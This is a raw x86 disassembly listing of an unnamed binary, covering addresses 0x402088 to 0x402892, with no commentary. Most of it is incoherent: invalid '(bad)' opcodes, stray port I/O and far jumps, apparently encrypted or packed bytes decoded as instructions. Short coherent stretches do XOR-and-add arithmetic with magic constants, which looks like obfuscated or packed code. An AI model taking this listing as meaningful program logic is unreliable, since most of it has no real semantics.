  402088:	pop    es
  402089:	cmp    ebp,DWORD PTR [ecx-0x7b]
  40208c:	ins    BYTE PTR es:[edi],dx
  40208d:	fadd   QWORD PTR [eax+eiz*4]
  402090:	pusha  
  402091:	push   ss
  402092:	jmp    0x2861:0x4aa136e9
  402099:	sub    eax,0xb83b18ed
  40209e:	ret    
  40209f:	and    al,BYTE PTR [edx-0x69]
  4020a2:	inc    ebx
  4020a3:	push   eax
  4020a4:	pop    esp
  4020a5:	pop    esp
  4020a6:	inc    ecx
  4020a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020a8:	inc    esp
  4020a9:	mov    dl,0xa8
  4020ab:	and    DWORD PTR [ebp*8-0x135b98ff],esp
  4020b2:	inc    esp
  4020b3:	pop    edi
  4020b4:	xchg   ecx,eax
  4020b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b7:	pop    ds
  4020b8:	and    eax,0xbee4bbee
  4020bd:	fucomip st,st(4)
  4020bf:	inc    ebx
  4020c0:	addr16 out 0x2a,eax
  4020c3:	pusha  
  4020c4:	sbb    al,BYTE PTR [esi+0x2a16b7df]
  4020ca:	into   
  4020cb:	es (bad) 
  4020cd:	lods   al,BYTE PTR ds:[esi]
  4020ce:	das    
  4020cf:	call   0x29fa:0xa55211fd
  4020d6:	inc    ebp
  4020d7:	mov    ds:0xbb64c1c8,eax
  4020dc:	sti    
  4020dd:	out    dx,eax
  4020de:	inc    edi
  4020df:	rol    BYTE PTR [eax-0x12],0xe2
  4020e3:	dec    edi
  4020e4:	idiv   BYTE PTR [esi+0x41]
  4020e7:	jle    0x4020f4
  4020e9:	xor    al,0x3a
  4020eb:	pop    esi
  4020ec:	mov    dh,0xbb
  4020ee:	jo     0x402111
  4020f0:	in     eax,0x8a
  4020f2:	mov    edi,0x890e61b1
  4020f7:	retf   
  4020f8:	sub    DWORD PTR [eax+0x4bee1ed9],eax
  4020fe:	test   al,0x73
  402100:	xlat   BYTE PTR ds:[ebx]
  402101:	pop    esp
  402102:	adc    ecx,edi
  402104:	outs   dx,DWORD PTR ds:[esi]
  402105:	pop    ecx
  402106:	add    eax,0x65283754
  40210b:	and    BYTE PTR [edx],0x76
  40210e:	in     al,0x3b
  402110:	sbb    BYTE PTR [edx+eiz*1+0x20],0xcb
  402115:	mov    dh,0x95
  402117:	cmc    
  402118:	mul    DWORD PTR [edx-0x4f]
  40211b:	lds    ecx,FWORD PTR [eax+esi*8]
  40211e:	ret    
  40211f:	cmp    al,0xe5
  402121:	je     0x4020e7
  402123:	push   eax
  402124:	test   BYTE PTR [ebx+ebx*8-0x51],0xb9
  402129:	sbb    al,0xd1
  40212b:	addr16 push 0xffffffe1
  40212e:	push   es
  40212f:	adc    bh,BYTE PTR [edx]
  402131:	mov    ebp,0x26278470
  402136:	pop    esp
  402137:	jbe    0x402189
  402139:	push   ds
  40213a:	jecxz  0x4020d4
  40213c:	fwait
  40213d:	add    eax,0x654ddb97
  402142:	jbe    0x4020d4
  402144:	push   0x6954bc14
  402149:	pop    ds
  40214a:	mov    BYTE PTR [ecx],0xd9
  40214d:	(bad)  
  40214e:	stos   BYTE PTR es:[edi],al
  40214f:	sbb    al,BYTE PTR [edx-0x66]
  402152:	mov    dh,dl
  402154:	stc    
  402155:	sub    DWORD PTR [edx+0x4c],esi
  402158:	mov    eax,ds:0x5908fdfc
  40215d:	sub    ebx,ebp
  40215f:	repz jp 0x402188
  402162:	mov    eax,ds:0x55b5e726
  402167:	fisubr DWORD PTR [ecx+0x169dee84]
  40216d:	aas    
  40216e:	mov    ch,0xdf
  402170:	or     al,0x3b
  402172:	push   ebx
  402173:	sub    esp,edx
  402175:	into   
  402176:	ret    
  402177:	imul   ebp,DWORD PTR [edi+0x51],0xffffff84
  40217b:	or     BYTE PTR [edx+0x3eaa3d40],0x76
  402182:	cmp    al,0xcb
  402184:	pop    ds
  402185:	std    
  402186:	stos   BYTE PTR es:[edi],al
  402187:	mov    WORD PTR [edi],?
  402189:	call   0x6e5f7113
  40218e:	inc    esp
  40218f:	dec    ebp
  402190:	mov    bh,0x12
  402192:	loope  0x40215f
  402194:	jecxz  0x40219b
  402196:	push   edx
  402197:	dec    edi
  402198:	ror    DWORD PTR [edi-0x65caa085],0xcd
  40219f:	imul   ecx,DWORD PTR [ecx+esi*8+0x58],0xffffffcf
  4021a4:	sbb    eax,0xac84713a
  4021a9:	mov    BYTE PTR [edi+0x2f8ee750],ch
  4021af:	sbb    bh,dl
  4021b1:	sti    
  4021b2:	test   edx,eax
  4021b4:	inc    esi
  4021b5:	pop    esi
  4021b6:	out    dx,eax
  4021b7:	sbb    dl,dh
  4021b9:	in     eax,dx
  4021ba:	pop    edx
  4021bb:	mov    esi,0xe6c3916e
  4021c0:	lods   eax,DWORD PTR ds:[esi]
  4021c1:	out    0x67,al
  4021c3:	jnp    0x402175
  4021c5:	mov    bh,0x8e
  4021c7:	jno    0x402183
  4021c9:	push   ebx
  4021ca:	popf   
  4021cb:	imul   esp,DWORD PTR [eax-0xa],0xcce12f64
  4021d2:	dec    ebp
  4021d3:	lock dec ebp
  4021d5:	cli    
  4021d6:	fsub   QWORD PTR [ecx+0x409a29b7]
  4021dc:	repz aam 0xb0
  4021df:	cmp    esp,ecx
  4021e1:	push   edx
  4021e2:	inc    esp
  4021e4:	mov    dh,0x47
  4021e6:	push   ebp
  4021e7:	ret    
  4021e8:	cmc    
  4021e9:	xchg   edx,eax
  4021ea:	xchg   DWORD PTR [edx],ebp
  4021ec:	and    al,BYTE PTR [eax]
  4021ee:	sub    DWORD PTR [ebx+ebx*4],0x52db8981
  4021f5:	arpl   WORD PTR [eax-0x6c2a14c8],sp
  4021fb:	ret    0x208c
  4021fe:	mov    esp,0xc55205fe
  402203:	mov    esi,DWORD PTR [ebp+0x28]
  402206:	mov    esp,0xed13c88f
  40220b:	xlat   BYTE PTR ds:[ebx]
  40220c:	dec    eax
  40220d:	sub    dl,BYTE PTR [edi]
  40220f:	pop    edx
  402210:	idiv   DWORD PTR [edi-0x63]
  402213:	sbb    bl,BYTE PTR [eax]
  402215:	mov    ch,0xe9
  402217:	mov    eax,ds:0x32fd1fad
  40221c:	mov    WORD PTR [edi-0x562ea775],es
  402222:	push   0x23c0250c
  402227:	stos   BYTE PTR es:[edi],al
  402228:	dec    edx
  402229:	xchg   esp,eax
  40222a:	sar    BYTE PTR [ebx-0x39968d5b],cl
  402230:	outs   dx,BYTE PTR ds:[esi]
  402231:	ins    DWORD PTR es:[edi],dx
  402232:	mov    bl,0x30
  402234:	inc    edi
  402235:	and    BYTE PTR [eax-0x12],bl
  402238:	cmc    
  402239:	xchg   edx,eax
  40223a:	push   ecx
  40223b:	pushw  ds
  40223d:	je     0x402288
  40223f:	sbb    al,0x87
  402241:	data16 loopne 0x4021ec
  402244:	push   cs
  402245:	add    cl,BYTE PTR [ebx-0x2d5b430a]
  40224b:	adc    DWORD PTR [ebx-0x18],edx
  40224e:	inc    esp
  40224f:	jmp    0x402257
  402251:	cmp    al,0x8
  402253:	das    
  402254:	in     eax,dx
  402255:	rol    BYTE PTR [esi+0x40a4bfd8],0xd4
  40225c:	fmul   DWORD PTR [eax+0x69]
  40225f:	push   eax
  402260:	cmp    esi,eax
  402262:	fst    DWORD PTR [ecx+0x144d03d9]
  402268:	out    dx,al
  402269:	sbb    dl,BYTE PTR [esp+edi*4+0x14]
  40226d:	inc    ebp
  40226e:	fsub   DWORD PTR [esi-0x72]
  402271:	lods   al,BYTE PTR ds:[esi]
  402272:	sar    BYTE PTR [edi-0x38],0x11
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [eax+edx*2],ebx
  40229c:	stc    
  40229d:	nop
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	bound  esi,QWORD PTR [eax]
  4022a8:	cs xchg esp,eax
  4022aa:	push   ebx
  4022ab:	hlt    
  4022ac:	mov    bl,0xf6
  4022ae:	test   cl,dl
  4022b0:	outs   dx,BYTE PTR ds:[esi]
  4022b1:	mov    edx,0x684a6f6b
  4022b6:	out    dx,al
  4022b7:	xor    BYTE PTR [esi],0x7a
  4022ba:	inc    edx
  4022bb:	mov    ebx,0xe49583
  4022c0:	cli    
  4022c1:	fmul   st,st(5)
  4022c3:	adc    BYTE PTR [esi],0x82
  4022c6:	jno    0x402250
  4022c8:	ins    DWORD PTR es:[edi],dx
  4022c9:	popf   
  4022ca:	add    eax,0x7c028c38
  4022cf:	ret    0x9df2
  4022d2:	call   0x709b63fc
  4022d7:	xor    eax,0xbe9d85fe
  4022dc:	sbb    eax,0x38a736ea
  4022e1:	mov    eax,0x641bca08
  4022e6:	jle    0x4022a2
  4022e8:	push   esi
  4022e9:	ffreep st(6)
  4022eb:	push   ecx
  4022ec:	cld    
  4022ed:	cmp    al,0x5b
  4022ef:	hlt    
  4022f0:	jmp    0x402315
  4022f2:	jl     0x402286
  4022f4:	jle    0x40229f
  4022f6:	imul   ebp,DWORD PTR [ebx-0x75],0xb
  4022fa:	add    edi,DWORD PTR [esi+0x7b65faf7]
  402300:	dec    ch
  402302:	les    ebx,FWORD PTR [ebx+0x6c914c90]
  402308:	cmc    
  402309:	test   DWORD PTR ds:0x2083b7b5,edi
  40230f:	rcl    esp,0xaa
  402312:	mov    ecx,DWORD PTR [ecx-0x15bafa2b]
  402318:	pop    eax
  402319:	and    DWORD PTR [esi],esp
  40231b:	cmp    BYTE PTR [ebp+0x4b65751b],ch
  402321:	inc    esi
  402322:	push   esi
  402323:	clc    
  402324:	mov    bl,0xef
  402326:	push   cs
  402327:	mov    al,ds:0x40dced67
  40232c:	int3   
  40232d:	(bad)  
  40232e:	idiv   BYTE PTR [ecx+0x3e7eea6b]
  402334:	fs cs mov dl,0xd2
  402338:	les    esp,FWORD PTR [eax-0x5e4de15d]
  40233e:	mov    ecx,DWORD PTR [edx+edi*8+0x39b3d3f9]
  402345:	pop    ds
  402346:	(bad)  
  402347:	data16 fstp TBYTE PTR [ebx]
  40234a:	nop
  40234b:	jecxz  0x402380
  40234d:	mov    ebx,DWORD PTR [eax]
  40234f:	js     0x40230b
  402351:	lods   al,BYTE PTR ds:[esi]
  402352:	mov    eax,0xdf126ab7
  402357:	cmp    BYTE PTR [ebp+0x26cdf1c0],al
  40235d:	in     al,0x8f
  40235f:	inc    ecx
  402360:	push   esp
  402361:	hlt    
  402362:	retf   0x5ae2
  402365:	sub    ch,BYTE PTR [ecx+0x421065fc]
  40236b:	pushf  
  40236c:	ficom  WORD PTR [ebx-0x39]
  40236f:	imul   si,WORD PTR [edi],0x236
  402374:	call   0x2159:0x10ac364f
  40237b:	push   esi
  40237c:	mov    ah,0xdb
  40237e:	mov    bh,BYTE PTR [esi+0x56]
  402381:	ret    0xcadf
  402384:	add    al,0xb9
  402386:	adc    edx,edx
  402388:	push   ebp
  402389:	pop    edi
  40238a:	mov    bh,0xe4
  40238c:	out    0x21,al
  40238e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40238f:	xchg   edx,eax
  402390:	and    BYTE PTR [esi+ebp*2-0x6b],bl
  402394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402395:	pop    es
  402396:	pop    ds
  402397:	push   eax
  402398:	adc    al,0xca
  40239a:	xor    eax,0xa56473ba
  40239f:	sbb    DWORD PTR [ecx+edx*4-0x2a8e534d],edx
  4023a6:	int3   
  4023a7:	js     0x40236c
  4023a9:	repz (bad) 
  4023ab:	rcr    DWORD PTR [ebp-0x67],cl
  4023ae:	leave  
  4023af:	jle    0x402338
  4023b1:	push   ebp
  4023b2:	inc    ebx
  4023b3:	imul   esp,DWORD PTR [ebx-0x517e3fff],0xe6e0cc5f
  4023bd:	cld    
  4023be:	aad    0x74
  4023c0:	add    ch,BYTE PTR [edx-0x4a]
  4023c3:	xchg   DWORD PTR [esi],edi
  4023c5:	lods   al,BYTE PTR ds:[esi]
  4023c6:	jp     0x402368
  4023c8:	ds ja  0x402374
  4023cb:	icebp  
  4023cc:	aas    
  4023cd:	js     0x40242d
  4023cf:	cwde   
  4023d0:	jno    0x40236d
  4023d2:	mov    ebx,0xffdf7461
  4023d7:	lds    eax,FWORD PTR [edx+eax*8]
  4023da:	pop    ds
  4023db:	das    
  4023dc:	cmc    
  4023dd:	sbb    ebx,edx
  4023df:	int    0x6d
  4023e1:	jbe    0x402402
  4023e3:	jnp    0x40242e
  4023e5:	sbb    dl,dl
  4023e7:	mov    cl,0xa3
  4023e9:	fstp   TBYTE PTR ds:0xc7bac1cf
  4023ef:	pop    ebp
  4023f0:	cld    
  4023f1:	jmp    0x4023ea
  4023f3:	jle    0x40241d
  4023f5:	pop    edx
  4023f6:	jge    0x402474
  4023f8:	mov    ch,0x77
  4023fa:	inc    esi
  4023fb:	push   ds
  4023fc:	add    al,dh
  4023fe:	fs repz ds ret 
  402402:	shl    BYTE PTR [edx+eax*8+0x19],cl
  402406:	test   BYTE PTR [edx+0x68],0x1e
  40240a:	shr    DWORD PTR [edi+0x37313b70],1
  402410:	pop    ecx
  402411:	jge    0x402460
  402413:	sbb    BYTE PTR [ecx+0x0],dh
  402416:	jno    0x4023a7
  402418:	sub    al,0x98
  40241a:	xchg   BYTE PTR [esi+0x1610bc5e],ah
  402420:	das    
  402421:	jge    0x4023dc
  402423:	or     DWORD PTR [edx-0x56],ebx
  402426:	pop    edx
  402427:	push   0xeb6a7050
  40242c:	stos   BYTE PTR es:[edi],al
  40242d:	cmp    edx,DWORD PTR [ecx+0x7fad6a21]
  402433:	add    BYTE PTR [esp+eax*2],al
  402436:	nop
  402437:	fdiv   QWORD PTR [eax-0x174f85ac]
  40243d:	adc    DWORD PTR [ebp+0x3b],0xd
  402441:	push   0x65fb8d10
  402446:	(bad)  
  402447:	or     dl,ch
  402449:	push   es
  40244a:	ja     0x4024ae
  40244c:	mov    ecx,0xc64954b9
  402451:	fidivr DWORD PTR [ecx+0x8]
  402454:	mov    WORD PTR [esi-0x5a7033c7],fs
  40245a:	xor    BYTE PTR [esi],bh
  40245c:	pop    ebx
  40245d:	fwait
  40245e:	mov    BYTE PTR [ebx-0x691f6088],dl
  402464:	daa    
  402465:	jmp    0x31b3:0xaec89cfa
  40246c:	loope  0x4023fe
  40246e:	and    edx,0xd2c46e90
  402474:	adc    BYTE PTR [esi-0x56],dl
  402477:	fst    QWORD PTR [edi+eiz*1+0x25496af5]
  40247e:	add    eax,0x6ec7de77
  402483:	(bad)  
  402484:	not    BYTE PTR [ebp-0x61]
  402487:	mov    WORD PTR [esi],?
  402489:	cmp    eax,0x72657b8c
  40248e:	es js  0x402502
  402491:	cli    
  402492:	mov    WORD PTR [ebx],ss
  402494:	cmp    ah,BYTE PTR [esi+0x55]
  402497:	mov    ecx,0xf7a7731d
  40249c:	pushf  
  40249d:	jnp    0x402470
  40249f:	ret    
  4024a0:	add    ch,BYTE PTR [edi-0xb]
  4024a3:	add    DWORD PTR [esi+0x15],esp
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x777eefc9],cl
  4024f4:	push   ebx
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024fe:	pop    ss
  4024ff:	out    dx,al
  402500:	bound  ebx,QWORD PTR [ecx]
  402502:	push   ebx
  402503:	mov    edi,0x96167cf6
  402508:	sti    
  402509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40250a:	xor    esp,DWORD PTR [eax+ebx*2-0x37630ad5]
  402511:	sub    eax,0xbd9f0099
  402516:	adc    eax,0x582cacb1
  40251b:	call   0x3e29:0x2f7ec4ca
  402522:	mov    esp,0x62666fc9
  402527:	ds inc edx
  402529:	sbb    dh,BYTE PTR [ebp+eiz*8-0x58]
  40252d:	not    bl
  40252f:	clc    
  402530:	in     eax,dx
  402531:	lds    ebx,FWORD PTR [esi+edx*2+0x7]
  402535:	mov    ah,0x6a
  402537:	add    ecx,DWORD PTR ds:0x67c44ec9
  40253d:	mov    eax,0x543e97ea
  402542:	push   esi
  402543:	stc    
  402544:	sub    al,0x49
  402546:	imul   esi,DWORD PTR [esi-0x3d34452],0x65f283f9
  402550:	es push edi
  402552:	adc    esi,DWORD PTR [eax]
  402554:	loope  0x40252a
  402556:	adc    DWORD PTR [esi-0x7fd02bb7],esp
  40255c:	lock leave 
  40255e:	cli    
  40255f:	fbld   TBYTE PTR [ecx+0xd]
  402562:	enter  0x1298,0xee
  402566:	cmp    DWORD PTR [edx+0x7a8026e2],ebx
  40256c:	push   DWORD PTR [edx+0x3d]
  40256f:	inc    eax
  402570:	adc    BYTE PTR [ecx-0x1df10341],dh
  402576:	sbb    al,0xb5
  402578:	scas   eax,DWORD PTR es:[edi]
  402579:	jg     0x40251b
  40257b:	lea    ebp,[esp+esi*2]
  40257e:	test   BYTE PTR [edx],ch
  402580:	popf   
  402581:	(bad)  
  402582:	pushf  
  402583:	mov    ?,esi
  402585:	ds iret 
  402587:	sar    DWORD PTR [ebx-0x1935d10c],0xf
  40258e:	xor    eax,0xea42dc9b
  402593:	mov    cl,0xed
  402595:	push   es
  402596:	ins    DWORD PTR es:[edi],dx
  402597:	out    0x8f,eax
  402599:	mov    ecx,DWORD PTR [esi-0x21]
  40259c:	and    dh,dl
  40259e:	cli    
  40259f:	and    esi,ecx
  4025a1:	sbb    esp,DWORD PTR [esi+eax*1+0x4b59c26a]
  4025a8:	shl    bl,0x36
  4025ab:	xor    BYTE PTR [edi-0x7e225ee1],dh
  4025b1:	sbb    al,0x58
  4025b3:	out    0x22,eax
  4025b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b6:	jb     0x402556
  4025b8:	push   esi
  4025b9:	add    al,0xdd
  4025bb:	out    dx,eax
  4025bc:	popf   
  4025bd:	sti    
  4025be:	inc    edx
  4025bf:	test   BYTE PTR [ebp+0x23],cl
  4025c2:	fst    DWORD PTR [edx+0x1fc1923d]
  4025c8:	sbb    BYTE PTR [edx+edx*8-0x2f6d4e87],dh
  4025cf:	xchg   esp,eax
  4025d0:	inc    edi
  4025d1:	sbb    al,0xd3
  4025d3:	retf   
  4025d4:	fwait
  4025d5:	nop
  4025d6:	push   eax
  4025d7:	jmp    0x40256a
  4025d9:	(bad)  
  4025da:	call   0x31:0x79e4328d
  4025e1:	clc    
  4025e2:	test   DWORD PTR ds:0x64304c86,0xecbf930d
  4025ec:	test   eax,0xb7c6c857
  4025f1:	mov    eax,ds:0x4949fe88
  4025f6:	rcr    eax,1
  4025f8:	jmp    0x116e:0xc8f24166
  4025ff:	inc    ecx
  402600:	jbe    0x4025f2
  402602:	and    al,BYTE PTR [esi-0x64fbbe6b]
  402608:	inc    edi
  402609:	xchg   DWORD PTR [eax],edi
  40260b:	jg     0x4025b5
  40260d:	icebp  
  40260e:	jo     0x402683
  402610:	jge    0x402613
  402612:	xchg   BYTE PTR [eax-0x3258ca6],bl
  402618:	dec    eax
  402619:	fldcw  WORD PTR [esi+0x34313cfb]
  40261f:	gs ja  0x40266f
  402622:	(bad)  
  402624:	jge    0x40267a
  402626:	cli    
  402627:	lods   al,BYTE PTR ds:[esi]
  402628:	lds    esp,FWORD PTR [ebp+0x6703d244]
  40262e:	push   edx
  40262f:	mov    edi,ecx
  402631:	pop    eax
  402632:	ins    DWORD PTR es:[edi],dx
  402633:	pop    esp
  402634:	sahf   
  402635:	retf   0x50e5
  402638:	or     BYTE PTR [edx+0x10],ah
  40263b:	sbb    al,0x63
  40263d:	test   BYTE PTR fs:[ecx-0x50a8eb6],cl
  402644:	push   eax
  402645:	es jl  0x4026ae
  402648:	xor    DWORD PTR [edi],esi
  40264a:	lahf   
  40264b:	jb     0x4025d1
  40264d:	pusha  
  40264e:	(bad)  
  40264f:	scas   eax,DWORD PTR es:[edi]
  402650:	jl     0x4025d4
  402652:	and    ebx,DWORD PTR [esp+esi*2-0x14]
  402656:	sbb    DWORD PTR [ecx+esi*4+0x1a],ecx
  40265a:	(bad)  
  40265b:	test   eax,0x130ffa46
  402660:	cmp    BYTE PTR [ebp-0x78],0xa2
  402664:	and    al,0x6d
  402666:	pop    edi
  402667:	(bad)  
  402668:	packsswb mm3,QWORD PTR [ebp-0x31]
  40266c:	xchg   esi,eax
  40266d:	outs   dx,BYTE PTR ds:[esi]
  40266e:	push   ss
  40266f:	imul   BYTE PTR [edi+0x96978]
  402675:	enter  0x99fe,0x5b
  402679:	add    eax,0x22d68082
  40267e:	xor    al,0x79
  402680:	add    bh,BYTE PTR [edi+0x1]
  402683:	xor    eax,0x57728036
  402688:	push   eax
  402689:	stos   DWORD PTR es:[edi],eax
  40268a:	jns    0x4026d8
  40268c:	inc    edi
  40268d:	cld    
  40268e:	xchg   BYTE PTR [esi+0x5b],ch
  402691:	push   edx
  402692:	lock mov ds:0x8aafe042,al
  402698:	xor    dl,ah
  40269a:	mov    ebx,0x96013927
  40269f:	xor    dl,BYTE PTR [eax+0x66c49ab]
  4026a5:	bound  esp,QWORD PTR [ecx+0x2e]
  4026a8:	aaa    
  4026a9:	aad    0xd8
  4026ab:	sti    
  4026ac:	push   ss
  4026ad:	jge    0x4026d6
  4026af:	ins    DWORD PTR es:[edi],dx
  4026b0:	jb     0x4026e4
  4026b2:	stos   DWORD PTR es:[edi],eax
  4026b3:	xlat   BYTE PTR ds:[ebx]
  4026b4:	xchg   DWORD PTR [edx],edi
  4026b6:	sbb    BYTE PTR [esp+edx*4+0x593a89f9],0xe3
  4026be:	add    DWORD PTR [edi-0x4e97d504],ebp
  4026c4:	iret   
  4026c5:	in     al,dx
  4026c6:	or     ebp,esp
  4026c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c9:	lods   al,BYTE PTR ds:[esi]
  4026ca:	or     eax,0xf0ae74fb
  4026cf:	sbb    eax,0x99fe7c82
  4026d4:	stos   BYTE PTR es:[edi],al
  4026d5:	cli    
  4026d6:	das    
  4026d7:	cmc    
  4026d8:	jns    0x402717
  4026da:	(bad)  
  4026db:	int3   
  4026dc:	dec    ebx
  4026dd:	mov    BYTE PTR [ecx-0x33],ch
  4026e0:	call   0x75d199a2
  4026e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026e6:	cli    
  4026e7:	out    dx,eax
  4026e8:	lods   eax,DWORD PTR ds:[esi]
  4026e9:	out    dx,eax
  4026ea:	ja     0x402717
  4026ec:	sbb    eax,0xf0233406
  4026f1:	mov    ah,0xf
  4026f3:	adc    esp,ebx
  4026f5:	mov    es,WORD PTR [edx]
  4026f7:	mov    dl,0xa7
  4026f9:	popf   
  4026fa:	aas    
  4026fb:	push   edx
  4026fc:	retf   
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xc188bf83
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	push   edx
  402768:	loope  0x40270e
  40276a:	(bad)  
  40276b:	xchg   edx,eax
  40276c:	shl    DWORD PTR [ebp+ebp*1-0x1f],cl
  402770:	mov    cl,0xbe
  402772:	loope  0x40273e
  402774:	pop    es
  402775:	adc    DWORD PTR [esi+0x40620a4],edx
  40277b:	(bad)  
  40277c:	sub    BYTE PTR [edx],dh
  40277e:	dec    esi
  40277f:	ret    0xa3b9
  402782:	ins    DWORD PTR es:[edi],dx
  402783:	ret    0x110b
  402786:	dec    ebp
  402787:	cli    
  402788:	fisubr WORD PTR [eax]
  40278a:	push   ds
  40278b:	int    0x5e
  40278d:	(bad)  
  40278f:	int    0x5f
  402791:	and    dl,ah
  402793:	dec    ecx
  402794:	loope  0x40280f
  402796:	pop    ss
  402797:	loop   0x4027c8
  402799:	pop    edx
  40279a:	mov    DWORD PTR ds:0x6df2e21b,ecx
  4027a0:	aam    0x43
  4027a2:	loop   0x40275f
  4027a4:	aaa    
  4027a5:	test   DWORD PTR [esi-0x1f],0xcbf7742f
  4027ac:	sti    
  4027ad:	inc    edi
  4027ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027af:	cmp    DWORD PTR [edx],ebx
  4027b1:	push   edi
  4027b2:	packssdw mm5,QWORD PTR [eax]
  4027b5:	stos   BYTE PTR es:[edi],al
  4027b6:	inc    edx
  4027b7:	ror    DWORD PTR [ecx],cl
  4027b9:	sub    al,0xe8
  4027bb:	or     eax,0x64886b66
  4027c0:	mov    ebx,0x26b46699
  4027c5:	idiv   cl
  4027c7:	pusha  
  4027c8:	movd   eax,mm2
  4027cb:	mov    ah,0x3a
  4027cd:	and    DWORD PTR [esi-0x2f2c2547],ebp
  4027d3:	cwde   
  4027d4:	addr16 push es
  4027d6:	aaa    
  4027d7:	popa   
  4027d8:	xor    eax,0x226cfe26
  4027dd:	data16 fimul DWORD PTR [esi+0x1f]
  4027e1:	fld    DWORD PTR [edi-0x61]
  4027e4:	pop    esi
  4027e5:	xchg   esi,eax
  4027e6:	adc    al,0x67
  4027e8:	mov    bh,0x80
  4027ea:	jmp    0x4027e8
  4027ec:	aad    0xff
  4027ee:	jbe    0x4027d4
  4027f0:	add    BYTE PTR ds:[eax-0x3bb7f72a],ch
  4027f7:	mov    dl,0xd5
  4027f9:	adc    BYTE PTR [edx+0x6666488b],al
  4027ff:	xor    BYTE PTR [edi+esi*4+0x24568553],dh
  402806:	push   ebx
  402807:	inc    esp
  402808:	cmp    eax,0xabd18531
  40280d:	adc    bh,ah
  40280f:	cmp    al,0xca
  402811:	pop    ecx
  402812:	loope  0x402842
  402814:	repz cmp BYTE PTR [ebp+0x41ec7b1f],dh
  40281b:	outs   dx,DWORD PTR ds:[esi]
  40281c:	loop   0x4027a5
  40281e:	(bad)  
  40281f:	mov    edx,0xc84b13b6
  402824:	bnd jo 0x4027e7
  402827:	and    ah,BYTE PTR [edi+0x57]
  40282a:	sti    
  40282b:	mov    eax,ds:0x6639580a
  402830:	icebp  
  402831:	mov    WORD PTR [esi-0x69e92b84],ss
  402837:	inc    ebx
  402838:	pushf  
  402839:	fwait
  40283a:	sbb    DWORD PTR [esi-0x5b8be2ae],esp
  402840:	jbe    0x402853
  402842:	outs   dx,BYTE PTR ds:[esi]
  402843:	inc    eax
  402844:	jo     0x4027e0
  402846:	fadd   QWORD PTR [ebx-0x7b]
  402849:	lea    eax,[edx+0x353dd887]
  40284f:	pop    ds
  402850:	pop    ds
  402851:	rcr    BYTE PTR [edi+edi*2],0x7e
  402855:	mov    ebx,ebp
  402857:	les    edx,FWORD PTR [esi*2-0x62a47874]
  40285e:	and    esi,DWORD PTR [edx]
  402860:	lds    esi,FWORD PTR [edx]
  402862:	sbb    BYTE PTR [edx-0x69b5e647],dh
  402868:	imul   ebx,DWORD PTR [edx+0x76],0xffffffd4
  40286c:	mov    al,ds:0x32b49e06
  402871:	retf   0x1490
  402874:	sub    eax,0xad81ec8a
  402879:	mov    edx,0xcabee71e
  40287e:	fist   DWORD PTR [eax]
  402880:	xchg   esp,eax
  402881:	add    BYTE PTR [ecx],ch
  402883:	cmp    DWORD PTR [ebx-0x2e29c807],ecx
  402889:	ja     0x4028a3
  40288b:	fcom   DWORD PTR ds:0x39862e5e
  402891:	xchg   edx,eax
  402892:	push   ebx
